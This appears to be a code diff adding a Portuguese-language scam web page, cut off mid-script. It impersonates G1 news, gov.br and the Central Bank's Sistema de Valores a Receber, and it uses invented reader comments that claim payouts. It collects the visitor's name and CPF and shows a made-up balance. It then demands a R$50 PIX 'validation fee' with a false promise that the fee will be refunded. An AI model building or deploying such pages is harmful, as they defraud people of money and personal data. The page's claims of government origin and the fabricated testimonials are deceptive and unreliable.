@@ -1,0 +1,231 @@
+                        <option>Nubank / Inter / C6</option>  
+                    </select>  
+                </div>  
+
+                <button onclick="salvarNomeEIrComentarios()" class="w-full bg-blue-600 text-white font-black py-5 rounded-2xl text-lg shadow-lg hover:bg-blue-700 transition-all transform active:scale-95">  
+                    CONTINUAR <i class="fas fa-arrow-right ml-2"></i>  
+                </button>  
+            </div>  
+        </div>  
+    </div>  
+</section>  
+
+<section id="p2" class="page">  
+    <header class="g1-red text-white py-4 px-4 shadow-md">  
+        <div class="max-w-4xl mx-auto flex justify-between items-center">  
+            <span class="text-3xl font-black italic tracking-tighter">g1</span>  
+            <span class="text-xs font-bold uppercase">Área de Comentários</span>  
+        </div>  
+    </header>  
+
+    <div class="max-w-3xl mx-auto bg-white p-6 md:p-12 mt-4 shadow-xl min-h-screen">  
+        <h3 class="text-2xl font-bold text-gray-800 border-b pb-6 mb-10 italic">O que os leitores estão dizendo (5.832)</h3>  
+          
+        <div class="space-y-10">  
+            <div class="flex gap-5">  
+                <img src="https://i.pravatar.cc/150?u=1" class="w-14 h-14 rounded shadow-md">  
+                <div>  
+                    <p class="text-blue-700 font-extrabold text-sm uppercase">Ricardo Silveira</p>  
+                    <p class="text-gray-700 text-base mt-2 leading-relaxed">Fiz a consulta agora e apareceu R$ 2.415,00! Eu nem acreditava que tinha tudo isso, mas lembrei que era de uma conta poupança que meu avó abriu pra mim no Bamerindus kkk. Já pedi o PIX!</p>  
+                    <p class="text-[10px] text-gray-400 mt-3 font-bold uppercase">Curtir (245) · Responder · há 5 min</p>  
+                </div>  
+            </div>  
+
+            <div class="flex gap-5 ml-16 border-l-2 pl-6">  
+                <img src="https://i.pravatar.cc/150?u=2" class="w-12 h-12 rounded shadow-md">  
+                <div>  
+                    <p class="text-blue-700 font-extrabold text-sm uppercase">Mariana Costa</p>  
+                    <p class="text-gray-700 text-sm mt-2 leading-relaxed">Ricardo, caiu na hora? O meu deu R$ 980, mas tô com medo de colocar o CPF.</p>  
+                    <p class="text-[10px] text-gray-400 mt-3 font-bold uppercase">há 2 min</p>  
+                </div>  
+            </div>  
+
+            <div class="flex gap-5">  
+                <img src="https://i.pravatar.cc/150?u=3" class="w-14 h-14 rounded shadow-md">  
+                <div>  
+                    <p class="text-blue-700 font-extrabold text-sm uppercase">Dona Izabel</p>  
+                    <p class="text-gray-700 text-base mt-2 leading-relaxed">Meu neto fez pra mim, eu tinha 4 mil reais de um abono salarial de 2008. Que benção esse dinheiro, vai ajudar muito no remédio.</p>  
+                    <p class="text-[10px] text-gray-400 mt-3 font-bold uppercase">Curtir (112) · Responder · há 15 min</p>  
+                </div>  
+            </div>  
+        </div>  
+
+        <div class="mt-20 bg-gray-50 p-10 rounded-2xl text-center border shadow-inner">  
+            <p class="text-gray-500 font-bold mb-6 italic uppercase tracking-widest text-xs">Você está na fila de acesso prioritário</p>  
+            <button onclick="irParaTransicao()" class="w-full bg-green-600 text-white font-black py-7 rounded-xl text-3xl shadow-2xl hover:bg-green-700 transition-all transform hover:scale-105 active:scale-95">  
+                ACESSAR SISTEMA GOV.BR <i class="fas fa-lock ml-2"></i>  
+            </button>  
+        </div>  
+    </div>  
+</section>  
+
+<section id="p3" class="page">  
+    <div class="flex flex-col items-center justify-center min-h-screen bg-white text-center p-6">  
+        <div class="loader mb-8"></div>  
+        <h2 class="text-2xl font-black text-slate-800 uppercase italic tracking-tighter">Saindo do G1</h2>  
+        <p class="text-slate-400 mt-2 font-medium">Redirecionando para o ambiente seguro do <b>Governo Federal</b>...</p>  
+        <div class="mt-12 opacity-30 grayscale flex gap-8">  
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_gov.br.png" class="h-6">  
+            <img src="https://logodownload.org/wp-content/uploads/2014/10/caixa-logo-1.png" class="h-6">  
+        </div>  
+    </div>  
+</section>  
+
+<section id="p_gov" class="page gov-bg min-h-screen">  
+    <header class="bg-white border-b-4 border-blue-600 p-4 shadow-sm">  
+        <div class="max-w-6xl mx-auto flex justify-between items-center">  
+            <div class="flex items-center gap-3">  
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_gov.br.png" class="h-8">  
+                <div class="h-6 w-[1px] bg-gray-300 mx-2"></div>  
+                <span class="text-blue-900 font-bold text-sm uppercase">Ministério da Fazenda</span>  
+            </div>  
+        </div>  
+    </header>  
+
+    <div class="gov-blue text-white py-14 px-4 text-center">  
+        <h1 class="text-3xl font-black mb-2">Sistema de Valores a Receber (SVR)</h1>  
+        <p class="text-blue-100 text-sm opacity-80 uppercase tracking-widest">Portal de Resgate Único</p>  
+    </div>  
+
+    <main class="max-w-md mx-auto px-4 -mt-10 pb-10">  
+        <div class="bg-white rounded-lg shadow-2xl p-8 md:p-12 border-t-[12px] border-blue-900">  
+            <div class="flex items-center gap-4 mb-8">  
+                <div class="w-10 h-10 bg-blue-900 text-white rounded-full flex items-center justify-center font-bold">1</div>  
+                <h2 class="text-xl font-black text-gray-800">Acesse sua conta</h2>  
+            </div>  
+              
+            <div class="space-y-6">  
+                <div>  
+                    <label class="block text-[10px] font-black text-gray-400 uppercase mb-2 tracking-widest">CPF do Titular</label>  
+                    <input type="text" id="cpf_input" placeholder="000.000.000-00" class="w-full p-4 border-b-2 border-gray-200 outline-none text-2xl font-mono focus:border-blue-600 transition-all bg-gray-50" maxlength="14">  
+                </div>  
+
+                <button onclick="finalizarConsulta()" class="w-full bg-blue-900 text-white py-5 rounded-full font-black text-lg shadow-xl hover:bg-blue-800 transition-all uppercase tracking-widest">  
+                    Continuar  
+                </button>  
+                  
+                <div class="grid grid-cols-2 gap-4 pt-4 opacity-40 grayscale">  
+                    <div class="border p-4 rounded-xl flex flex-col items-center"><i class="fas fa-university mb-2"></i><span class="text-[9px] font-bold">BANCOS</span></div>  
+                    <div class="border p-4 rounded-xl flex flex-col items-center"><i class="fas fa-qrcode mb-2"></i><span class="text-[9px] font-bold">QR CODE</span></div>  
+                </div>  
+            </div>  
+        </div>  
+        <p class="text-center text-[10px] text-gray-400 mt-10 uppercase font-black tracking-widest">Governo Federal do Brasil</p>  
+    </main>  
+</section>  
+
+<section id="p_pagamento" class="page gov-bg min-h-screen">  
+    <header class="bg-white border-b-4 border-blue-600 p-4 shadow-sm">  
+        <div class="max-w-6xl mx-auto flex justify-between items-center">  
+            <div class="flex items-center gap-3">  
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_gov.br.png" class="h-8">  
+                <div class="h-6 w-[1px] bg-gray-300 mx-2"></div>  
+                <span class="text-blue-900 font-bold text-sm uppercase">Ministério da Fazenda</span>  
+            </div>  
+        </div>  
+    </header>  
+
+    <div class="gov-blue text-white py-14 px-4 text-center">  
+        <h1 class="text-3xl font-black mb-2">Validação de Segurança</h1>  
+        <p class="text-blue-100 text-sm opacity-80 uppercase tracking-widest">Proteção contra Robôs</p>  
+    </div>  
+
+    <main class="max-w-md mx-auto px-4 -mt-10 pb-10">  
+        <div class="bg-white rounded-lg shadow-2xl p-8 md:p-12 border-t-[12px] border-blue-900">  
+            <div class="flex justify-center mb-8">  
+                <div class="bg-yellow-100 text-yellow-600 p-6 rounded-full"><i class="fas fa-shield-alt text-4xl"></i></div>  
+            </div>  
+
+            <h2 class="text-2xl font-black text-center text-gray-800 mb-6">Confirme sua Identidade</h2>  
+              
+            <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-8 rounded">  
+                <p class="text-sm text-blue-900 font-semibold mb-2">⚠️ Taxa de Validação</p>  
+                <p class="text-xs text-blue-800 leading-relaxed">Para garantir que você é uma pessoa real e não um robô, é necessário fazer uma pequena transação de <strong>R$ 50,00</strong>.</p>  
+                <p class="text-xs text-green-700 font-bold mt-3 flex items-center"><i class="fas fa-check-circle mr-2"></i>Este valor será <strong>devolvido integralmente</strong> após a validação!</p>  
+            </div>  
+
+            <div class="bg-gray-100 p-6 rounded-2xl mb-8 space-y-4">  
+                <div class="flex justify-between items-center pb-4 border-b border-gray-200">  
+                    <span class="text-sm text-gray-600 font-semibold">Saldo a Receber:</span>  
+                    <span id="pag_saldo_total" class="text-2xl font-black text-green-600">R$ 0,00</span>  
+                </div>  
+                <div class="flex justify-between items-center pb-4 border-b border-gray-200">  
+                    <span class="text-sm text-gray-600 font-semibold">Taxa de Validação:</span>  
+                    <span class="text-xl font-black text-red-600">- R$ 50,00</span>  
+                </div>  
+                <div class="flex justify-between items-center pt-2">  
+                    <span class="text-sm font-bold text-gray-800">Você Receberá:</span>  
+                    <span id="pag_saldo_liquido" class="text-2xl font-black text-green-700">R$ 0,00</span>  
+                </div>  
+            </div>  
+
+            <p class="text-center text-xs text-gray-500 mb-6 italic">Após a validação, você receberá o valor total via PIX em sua conta</p>  
+
+            <button onclick="irParaPagamentoPix()" class="w-full bg-green-600 text-white py-5 rounded-2xl font-black text-lg shadow-xl hover:bg-green-700 transition-all uppercase mb-3">  
+                PAGAR R$ 50,00 PARA VALIDAR <i class="fas fa-lock ml-2"></i>  
+            </button>  
+
+            <button onclick="fecharModal()" class="w-full bg-gray-300 text-gray-700 py-3 rounded-2xl font-bold text-sm shadow-md hover:bg-gray-400 transition-all uppercase">  
+                Cancelar  
+            </button>  
+        </div>  
+        <p class="text-center text-[10px] text-gray-400 mt-10 uppercase font-black tracking-widest">Governo Federal do Brasil</p>  
+    </main>  
+</section>  
+
+<div id="saldoModal">  
+    <div class="bg-white rounded-3xl p-8 max-w-sm w-full shadow-2xl border-4 border-green-500">  
+        <div class="flex justify-center mb-6">  
+            <div class="bg-green-100 text-green-600 p-5 rounded-full"><i class="fas fa-check-double text-4xl"></i></div>  
+        </div>  
+        <h3 class="text-2xl font-black text-center text-gray-800 mb-2">VALOR LOCALIZADO!</h3>  
+        <p class="text-center text-gray-500 text-[10px] mb-6 uppercase font-bold tracking-widest">Banco Central do Brasil - SVR</p>  
+          
+        <div class="bg-gray-100 p-5 rounded-2xl mb-8 space-y-4">  
+            <div class="flex justify-between border-b border-gray-200 pb-2">  
+                <span class="text-[10px] text-gray-400 font-bold uppercase">Beneficiário:</span>  
+                <span id="res_nome" class="text-xs font-black text-gray-700 uppercase">---</span>  
+            </div>  
+            <div class="flex justify-between items-center">  
+                <span class="text-[10px] text-gray-400 font-bold uppercase">Saldo Disponível:</span>  
+                <span id="res_saldo" class="text-2xl font-black text-green-600">R$ 0,00</span>  
+            </div>  
+        </div>  
+
+        <button onclick="irParaPagamento()" class="w-full bg-green-600 text-white py-5 rounded-2xl font-black text-xl shadow-xl hover:bg-green-700 transition-all uppercase animate-pulse">  
+            RECEBER VIA PIX <i class="fas fa-bolt ml-1"></i>  
+        </button>  
+    </div>  
+</div>  
+
+<script>  
+    let nomeSalvo = "";  
+    let saldoGerado = 0;  
+
+    function showPage(id) {  
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));  
+        document.getElementById(id).classList.add('active');  
+        window.scrollTo(0, 0);  
+    }  
+
+    function salvarNomeEIrComentarios() {  
+        const inputNome = document.getElementById('user_name').value;  
+        if(inputNome.length < 5) {  
+            alert("Por favor, digite seu nome completo para prosseguir.");  
+            return;  
+        }  
+        nomeSalvo = inputNome;  
+        showPage('p2');  
+    }  
+
+    function irParaTransicao() {  
+        showPage('p3');  
+        setTimeout(() => { showPage('p_gov'); }, 3000);  
+    }  
+
+    // Máscara de CPF automática  
+    document.addEventListener('DOMContentLoaded', function() {  
+        const cpfInput = document.getElementById('cpf_input');  
+        if(cpfInput) {  
+            cpfInput.addEventListener('input', function(e) {  
+                let value = e.target.value.replace(/\D/g, 
